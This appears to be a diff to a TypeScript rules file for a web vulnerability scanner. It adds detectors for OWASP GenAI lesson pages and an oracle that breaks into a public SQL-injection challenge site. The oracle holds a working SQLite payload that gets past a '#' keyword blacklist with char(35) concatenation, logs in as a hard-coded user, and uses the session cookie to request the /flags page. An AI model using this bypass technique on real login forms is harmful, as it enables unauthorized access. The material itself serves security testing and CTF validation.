@@ -71215,13 +71215,25 @@ const OWASP_GENAI_LESSON_DEFS: Record<string, OwaspGenaiLessonDef> = {
     llmId: "LLM07",
     titleRe: /LLM07:\s*System Prompt Leakage/i,
     topicMarkers: [/System Prompt Leakage/i, /system prompts can be extracted|demo-player__system-prompt/i]
+  },
+  "data-poisoning": {
+    slug: "data-poisoning",
+    llmId: "LLM04",
+    titleRe: /LLM04:\s*Data and Model Poisoning/i,
+    topicMarkers: [/Data and Model Poisoning/i, /Backdoor triggers|fine-tuning poisoning|training data/i]
+  },
+  "misinformation": {
+    slug: "misinformation",
+    llmId: "LLM09",
+    titleRe: /LLM09:\s*Misinformation/i,
+    topicMarkers: [/Misinformation|Hallucination/i, /Hallucinated|Package hallucination|Fabricated legal/i]
   }
 };
 
 async function ensureOwaspGenaiRegistrySession(ctx: RuleContext): Promise<string | undefined> {
   const onboardUrl = new URL("/onboard", ctx.origin).toString();
   const body =
-    "name=thugir&goals=prompt-injection&goals=sensitive-info&goals=supply-chain&goals=improper-output&goals=system-prompt-leakage&goals=data-poisoning";
+    "name=thugir&goals=prompt-injection&goals=sensitive-info&goals=supply-chain&goals=improper-output&goals=system-prompt-leakage&goals=data-poisoning&goals=misinformation";
   const res = await ctx.probe.get(onboardUrl, {
     method: "POST",
     body,
@@ -71292,6 +71304,87 @@ const owaspGenaiImproperOutputRouteLiveOracle: Rule = async (ctx) =>
 
 const owaspGenaiSystemPromptLeakageRouteLiveOracle: Rule = async (ctx) =>
   (await probeOwaspGenaiLessonRoute(ctx, "system-prompt-leakage")) ?? NEGATIVE;
+
+const owaspGenaiDataPoisoningRouteLiveOracle: Rule = async (ctx) =>
+  (await probeOwaspGenaiLessonRoute(ctx, "data-poisoning")) ?? NEGATIVE;
+
+const owaspGenaiMisinformationRouteLiveOracle: Rule = async (ctx) =>
+  (await probeOwaspGenaiLessonRoute(ctx, "misinformation")) ?? NEGATIVE;
+
+const SQL_INJECTION_CHALLENGE_HOST_RE = /sql-injection-challenge\.vercel\.app/i;
+/** Bypasses # blacklist via SQLite char(35) concat — see Jupiterian/SQL-Injection-Challenge main.py */
+const SQL_INJECTION_CHALLENGE_LOGIN_PASSWORD_PAYLOAD =
+  "'||'qL'||char(35)||'7vP!3tY^8mB@2fW$6zR'||'";
+
+const sqlInjectionChallengeLoginSqliLiveOracle: Rule = async (ctx) => {
+  const corpus = `${ctx.origin}\n${ctx.scanUrl || ""}\n${ctx.home.finalUrl || ""}\n${ctx.combined}`;
+  if (!SQL_INJECTION_CHALLENGE_HOST_RE.test(corpus)) return NEGATIVE;
+  if (!/Admin123GOATee/i.test(corpus)) return NEGATIVE;
+  const loginUrl = new URL("/login", ctx.origin).toString();
+  const badBody = new URLSearchParams({
+    username: "thugir-invalid-probe",
+    password: "badpass"
+  }).toString();
+  const badDoc = await ctx.probe.get(loginUrl, {
+    method: "POST",
+    body: badBody,
+    headers: { "Content-Type": "application/x-www-form-urlencoded" },
+    maxBytes: 512,
+    timeoutMs: 15000
+  });
+  if (!/Login failed!/i.test(badDoc.body)) return NEGATIVE;
+  const sqliBody = new URLSearchParams({
+    username: "Admin123GOATee",
+    password: SQL_INJECTION_CHALLENGE_LOGIN_PASSWORD_PAYLOAD
+  }).toString();
+  const sqliDoc = await ctx.probe.get(loginUrl, {
+    method: "POST",
+    body: sqliBody,
+    headers: { "Content-Type": "application/x-www-form-urlencoded" },
+    maxBytes: 8192,
+    timeoutMs: 15000
+  });
+  if (!/Login Success|Welcome to the vault/i.test(sqliDoc.body)) return NEGATIVE;
+  const sessionCookie = sqliDoc.setCookies.find((c) => /^session=/i.test(c))?.split(";")[0];
+  if (!sessionCookie) return NEGATIVE;
+  const flagsUrl = new URL("/flags", ctx.origin).toString();
+  const flagsDoc = await ctx.probe.get(flagsUrl, {
+    maxBytes: 4096,
+    timeoutMs: 12000,
+    headers: { Cookie: sessionCookie }
+  });
+  if (flagsDoc.status === 403 || /Access denied!/i.test(flagsDoc.body)) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: 0.93,
+    evidence: {
+      url: loginUrl,
+      username: "Admin123GOATee",
+      payload: SQL_INJECTION_CHALLENGE_LOGIN_PASSWORD_PAYLOAD.slice(0, 48),
+      snippet: sqliDoc.body.match(/Login Success|Welcome to the vault/i)?.[0] ?? "Login Success",
+      note: "sql-injection-challenge.vercel.app POST /login accepts Admin123GOATee with char(35) concat password bypassing # blacklist — SQLite authentication bypass oracle"
+    }
+  };
+};
+
+const sqlInjectionChallengeLoginSqliRouteLiveOracle: Rule = async (ctx) => {
+  if (!SQL_INJECTION_CHALLENGE_HOST_RE.test(`${ctx.origin}\n${ctx.scanUrl || ""}\n${ctx.home.finalUrl || ""}`))
+    return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/(?:^|\/)login(?:\/|$|\?|#)/i.test(pageUrl) && pageUrl.replace(/\/$/, "") !== ctx.origin.replace(/\/$/, ""))
+    return NEGATIVE;
+  const result = await sqlInjectionChallengeLoginSqliLiveOracle(ctx);
+  if (!result.fired) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: result.confidence,
+    evidence: {
+      ...result.evidence,
+      scannedUrl: pageUrl,
+      note: "sql-injection-challenge.vercel.app route scan — POST /login char(35) concat bypasses keyword filter and reaches /flags — SQL injection login oracle"
+    }
+  };
+};
 
 // --- CTF DeFi Security 101 (ctf-maker-monorepo.vercel.app) ----------------------------
 const CLIENT_CTF_DEFI_RES: { label: string; re: RegExp }[] = [
@@ -81757,6 +81850,10 @@ export const RULES: Record<string, Rule> = {
   owaspGenaiSupplyChainRouteLiveOracle,
   owaspGenaiImproperOutputRouteLiveOracle,
   owaspGenaiSystemPromptLeakageRouteLiveOracle,
+  owaspGenaiDataPoisoningRouteLiveOracle,
+  owaspGenaiMisinformationRouteLiveOracle,
+  sqlInjectionChallengeLoginSqliLiveOracle,
+  sqlInjectionChallengeLoginSqliRouteLiveOracle,
   clientSideCtfDefiEvidence,
   clientSideAtlasCrewInfernoLabEvidence,
   clientSideAtlasCrewEdgeProtectionEvidence,
